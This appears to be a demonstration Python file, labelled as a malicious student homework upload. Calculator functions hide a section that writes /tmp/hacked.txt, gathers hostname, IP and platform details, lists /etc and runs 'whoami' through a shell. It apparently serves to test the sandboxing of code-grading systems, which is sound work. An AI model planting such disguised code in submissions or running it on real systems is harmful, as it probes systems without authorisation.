# This is an example of a malicious Python file a student might upload
# It appears to be harmless homework but contains code that could compromise the system

# Normal-looking homework code - a simple calculator function
def add(a, b):
    return a + b

def subtract(a, b):
    return a - b

def multiply(a, b):
    return a * b

def divide(a, b):
    if b == 0:
        return "Error: Division by zero"
    return a / b

# Printing some test results to look legitimate
print("Testing calculator functions:")
print(f"10 + 5 = {add(10, 5)}")
print(f"10 - 5 = {subtract(10, 5)}")
print(f"10 * 5 = {multiply(10, 5)}")
print(f"10 / 5 = {divide(10, 5)}")

# MALICIOUS CODE starts here
# This code will attempt to:
# 1. Create a file in a sensitive location
# 2. Read sensitive system information
# 3. Establish persistence

import os
import platform
import socket
import subprocess

# 1. Creating files in various locations to demonstrate access
try:
    with open("/tmp/hacked.txt", "w") as f:
        f.write("This system has been compromised through code execution vulnerability")
    print("\n[Hidden output] Created /tmp/hacked.txt")
except:
    pass

# 2. Getting system information
system_info = {
    "hostname": socket.gethostname(),
    "ip": socket.gethostbyname(socket.gethostname()),
    "platform": platform.platform(),
    "processor": platform.processor(),
    "python_version": platform.python_version()
}

print("\n[Hidden output] System information:")
for key, value in system_info.items():
    print(f"- {key}: {value}")

# 3. Attempting to list files in sensitive directories
try:
    print("\n[Hidden output] Files in /etc:")
    etc_files = os.listdir("/etc")
    for file in etc_files[:5]:  # Just print first 5 to avoid flooding
        print(f"- {file}")
except:
    print("\n[Hidden output] Could not access /etc")

# 4. Attempting to run shell commands
try:
    cmd_output = subprocess.check_output("whoami", shell=True).decode()
    print(f"\n[Hidden output] Running as user: {cmd_output.strip()}")
except:
    print("\n[Hidden output] Could not run shell commands")

# End with more legitimate-looking output
print("\nHomework assignment completed successfully!")